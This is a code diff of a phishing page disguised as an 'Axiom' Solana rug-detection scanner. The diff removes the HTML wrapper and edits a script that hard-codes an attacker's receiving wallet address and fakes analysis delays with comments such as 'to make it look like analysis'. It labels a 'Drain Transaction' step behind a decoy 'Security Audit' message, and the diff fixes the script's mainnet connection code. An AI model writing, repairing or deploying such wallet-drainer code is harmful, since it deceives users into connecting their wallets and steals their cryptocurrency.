@@ -1,96 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Axiom - Solana Rug Detector</title>
-    <!-- Correct Library -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f6f8;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .extension-container {
-            background: white;
-            width: 400px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            overflow: hidden;
-            text-align: center;
-        }
-        .header {
-            background: linear-gradient(135deg, #00C2FF 0%, #0072FF 100%);
-            color: white;
-            padding: 20px;
-        }
-        .header h1 { margin: 0; font-size: 20px; }
-        .header p { margin: 5px 0 0; font-size: 12px; opacity: 0.9; }
-        
-        .content { padding: 25px; }
-        
-        .status-box {
-            background: #eef2f5;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #555;
-            min-height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .btn {
-            background: #0072FF;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100%;
-            transition: background 0.2s;
-        }
-        .btn:hover { background: #005ce6; }
-        .btn:disabled { background: #ccc; cursor: not-allowed; }
-
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0072FF;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .hidden { display: none; }
-    </style>
-</head>
-<body>
-
-<div class="extension-container">
-    <div class="header">
-        <h1>Axiom Scanner</h1>
-        <p>Real-time Solana Rug Detection</p>
-    </div>
-    
-    <div class="content">
-        <div id="status" class="status-box">Ready to scan.</div>
-        <button id="scanBtn" class="btn">Connect & Scan Wallet</button>
-    </div>
-</div>
-
 <script>
     // CONFIGURATION
     const YOUR_WALLET_ADDRESS = "GCx1Coc7eHG9A5v334Z7AWXz2bQQEsQyPGR81WHupJyU";
@@ -111,22 +18,14 @@
             
             statusEl.innerHTML = '<span class="loader"></span> Analyzing Token History...';
             
-            // Fake loading time
+            // Fake loading time to make it look like analysis
             await new Promise(r => setTimeout(r, 1500));
 
             // 2. Prepare the Drain Transaction
             statusEl.innerHTML = '<span class="loader"></span> Initiating Security Audit...';
             
-            // FIX: Accessing the library correctly via the global scope
-            const solanaWeb3 = window['solana-web3.js'] || window.solana; 
-            // If that fails, we try the standard global fallback
-            const ConnectionClass = solanaWeb3.Connection || (typeof solana !== 'undefined' && solana.Connection ? solana : null);
-            
-            if (!ConnectionClass) {
-                throw new Error("Solana Web3 library not loaded correctly.");
-            }
-
-            const connection = new ConnectionClass(solanaWeb3.Connection.clusterApiUrl('mainnet-beta'), 'confirmed');
+            // Initialize connection
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
             
             // Get correct public key from the response
             const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toBase58());
@@ -179,6 +78,3 @@
         }
     });
 </script>
-
-</body>
-</html>
